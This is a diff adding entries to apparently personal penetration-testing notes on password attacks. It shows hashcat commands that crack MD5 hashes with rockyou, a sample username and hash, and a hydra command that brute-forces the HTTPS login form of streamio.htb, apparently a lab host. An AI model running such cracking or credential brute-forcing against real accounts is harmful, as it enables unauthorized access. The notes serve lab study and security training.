@@ -191,3 +191,19 @@ kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.
 ```bash
 hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
+
+#### With Additional Field in File & Show Output
+
+```bash
+# Rebecca:bf55e15b119860a6e6b5a164377da719
+hashcat -m 0 --user sql.output /usr/share/wordlists/rockyou.txt --force
+hashcat -m 0 --user sql.output --show
+```
+
+#### Automating Login User & Pass HTTP
+
+Pay attention to whether you put http-post-form or https-post-form. Creds.txt is user:pass format.
+
+```bash
+hydra -C creds.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+```
